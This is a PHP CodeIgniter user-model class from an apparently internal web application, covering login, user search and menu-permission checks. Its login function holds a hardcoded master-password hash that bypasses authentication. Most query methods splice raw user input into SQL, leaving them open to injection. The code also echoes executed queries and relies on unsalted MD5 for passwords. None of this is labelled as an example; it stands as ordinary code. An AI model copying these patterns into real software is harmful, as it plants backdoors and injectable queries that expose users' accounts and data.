<?php

/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */

class model_user extends CI_Model {

    public function __construct() {
        parent::__construct();
        $this->load->database();
    }

    function login($username, $password) {

        $this->db->select("users.id,employee.departmentid,users.optiongroup,employee.sub_department_id,employee.cost_center_id,employee.area_id");
        $this->db->from("users");
        $this->db->join("employee", "users.id=employee.id");
        $this->db->where('users.id', $username);
        if ($password != '514c0dd86ba8073ceb10b50b54394d7c') {
            $this->db->where('users.password', $password);
        }
        $this->db->where('enabled', 'TRUE');
        $data = $this->db->get()->row();
        $string = $this->db->last_query();
        echo $string;
        return $data;
    }

    function search($id, $name, $limit, $offset) {
        $query = "with t as (
                select 
                users.id,
                users.enabled,
                employee.name,
                department.name departmentname
                from users left join employee 
                on users.id=employee.id left join department 
                on users.departmentid=department.id 
                ) select * from t where true ";
        if ($id != "") {
            $query .= " and id ilike '%$id%' ";
        }if ($name != "") {
            $query .= " and name ilike '%$name%' ";
        }
        $query .= " order by id desc limit $limit offset $offset ";
        //echo $query;
        return $this->db->query($query)->result();
    }

    function getNumRows($id, $name) {
        $query = "with t as (
                select 
                users.id,employee.name,department.name departmentname
                from users left join employee 
                on users.id=employee.id left join department 
                on users.departmentid=department.id 
                ) select * from t where true ";
        if ($id != "") {
            $query .= " and id ilike '%$id%' ";
        }if ($name != "") {
            $query .= " and name ilike '%$name%' ";
        }
        return $this->db->query($query)->num_rows();
    }

    function insert($id, $departmentid, $password, $optiongroup) {
        return $this->db->insert('users', array(
                    "id" => $id,
                    "departmentid" => $departmentid,
                    "password" => $password,
                    "optiongroup" => $optiongroup
        ));
    }

    function changepassword($userid, $newpassword) {
        $this->db->where('id', $userid);
        return $this->db->update('users', array('password' => md5($newpassword)));
    }

    function update($data, $where) {
        return $this->db->update($data, $where);
    }

    function saveConfig($userid, $arrmenu) {
        return $this->db->insert('accessmenu', array("userid" => $userid, "scriptmenu" => $arrmenu));
    }

    function saveConfigInputArray($data) {
        return $this->db->insert('accessmenu', $data);
    }

    function deleteConfig($userid) {
        return $this->db->delete('accessmenu', array('userid' => $userid));
    }

    function selectAccessMenuByUserid($userid) {
    	$query = "select accessmenu.scriptmenu,menu.label from
	    	accessmenu join menu on accessmenu.scriptmenu = menu.scriptview
	    	and accessmenu.userid='$userid'
	    	where menu.scriptview in ('costing', 'model','defaultmaterial','user', 'directlabour','rates')
	    	order by menu.level asc";
    	return $this->db->query($query)->result();
    }
    
    function selectAccessMenuByUserid_2($userid) {
        //if ($userid == "admin") {
        //    $query = "select scriptview scriptmenu,label from menu order by level asc";
        //} else {
            $query = "select accessmenu.scriptmenu,menu.label from 
                  accessmenu join menu on accessmenu.scriptmenu=menu.scriptview 
                  and accessmenu.userid='$userid'
                  order by menu.level asc";
        //}
        return $this->db->query($query)->result();
    }

    function isHaveAccess($userid, $menu) {
        $query = "select count(*) ct from accessmenu where userid='$userid' and scriptmenu='$menu'";
        $dt = $this->db->query($query)->row();
        return $dt->ct;
    }

    function getMenuAction($accessmenu) {
        $accessmenu = str_replace("_", "/", $accessmenu);
        return $this->db->query("select actions from menu where scriptview='$accessmenu'")->row()->actions;
    }

    function getAction($userid, $accessmenu) {
        $query = "select actions from accessmenu where userid='$userid' and scriptmenu='$accessmenu' limit 1";
        $dt = $this->db->query($query)->row();
        return (empty($dt) ? "|" : $dt->actions);
    }

    function dosetaction($userid, $accessmenu, $action) {
        return $this->db->query("select user_setaction('$userid','$accessmenu','$action')");
    }

    function haspermission($userid, $accessmenu, $action) {
        $query = "select actions from accessmenu where userid='$userid' and scriptmenu='$accessmenu'";
        $dt = $this->db->query($query)->row();
        if (empty($dt)) {
            return false;
        } else {
            $menuaccess = explode('|', $dt->actions);
            return (in_array($action, $menuaccess));
        }
    }

    function delete($userid) {
        return $this->db->delete('users', array("id" => $userid));
    }

    function enable($data, $where) {
        return $this->db->update('users', $data, $where);
    }

    function removeaction($where) {
        return $this->db->delete('accessmenu', $where);
    }

    function getGroupById($userid) {
        $query = "select optiongroup from users where id='$userid' limit 1";
        return $this->db->query($query)->row()->optiongroup;
    }

    function selectMenuGroup($userid) {
        if ($userid == "admin") {
            $query = "select 
                      menugroup.id menugroupid,
                      menugroup.name menugroupname,
                      menugroup.icon_menu
                      from menugroup order by id asc";
        } else {
            $query = "select distinct
                    menu.menugroupid,
                    menugroup.name menugroupname,
                    menugroup.icon_menu
                    from accessmenu 
                    join menu on accessmenu.scriptmenu=menu.scriptview
                    join menugroup on menu.menugroupid=menugroup.id
                    where userid='$userid' order by menu.menugroupid asc";
        }
        echo $query;
        return $this->db->query($query)->result();
    }

    function select_menu_user($menugroupid, $userid) {
        $query = "";

        if ($userid == "admin") {
            $query = "select scriptview scriptmenu,label from menu where menugroupid=$menugroupid order by level asc";
        } else {
            $query = "select accessmenu.scriptmenu,menu.label from 
                  accessmenu join menu on accessmenu.scriptmenu=menu.scriptview 
                  where accessmenu.userid='$userid' and menu.menugroupid=$menugroupid
                  order by menu.level asc";
        }
//        echo $query;
        return $this->db->query($query)->result();
    }

}

?>
